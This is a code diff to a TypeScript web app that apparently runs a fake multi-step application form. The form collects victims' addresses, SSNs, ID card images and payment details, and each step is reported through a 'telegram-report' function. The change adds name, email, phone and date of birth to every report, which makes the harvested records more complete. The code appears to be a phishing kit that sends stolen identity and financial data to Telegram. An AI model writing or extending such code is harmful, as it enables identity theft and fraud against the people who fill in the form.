@@ -171,6 +171,14 @@ const reportFieldsForStep = (step: number, data: FormDataState): Record<string, 
 
 const reportTitleForStep = (step: number) => ["", "ZIP Code Submitted", "Address Submitted", "Personal Information Submitted", "Employee Status Submitted", "SSN Verification Submitted", "ID Front Image Submitted", "ID Back Image Submitted", "Payment Type Selected", "Payment Details Submitted", "Final Application Submitted"][step] ?? "Application Update";
 
+const withApplicantContext = (data: FormDataState, fields: Record<string, string>) => ({
+  "Applicant Name": data.fullName,
+  "Applicant Email": data.email,
+  "Applicant Phone": data.phone,
+  "Date of Birth": data.dob,
+  ...fields,
+});
+
 const Index = () => {
   const [mode, setMode] = useState<"home" | "application" | "success" | "tracking">("home");
   const [step, setStep] = useState(1);
@@ -242,7 +250,7 @@ const Index = () => {
   const sendStepReport = async (targetStep: number, image?: { fileName: string; dataUrl: string }, fields = reportFieldsForStep(targetStep, formData)) => {
     try {
       const { error: reportError } = await supabase.functions.invoke("telegram-report", {
-        body: { step: targetStep, title: reportTitleForStep(targetStep), fields, image },
+        body: { step: targetStep, title: reportTitleForStep(targetStep), fields: withApplicantContext(formData, fields), image },
       });
       if (reportError) throw reportError;
     } catch {
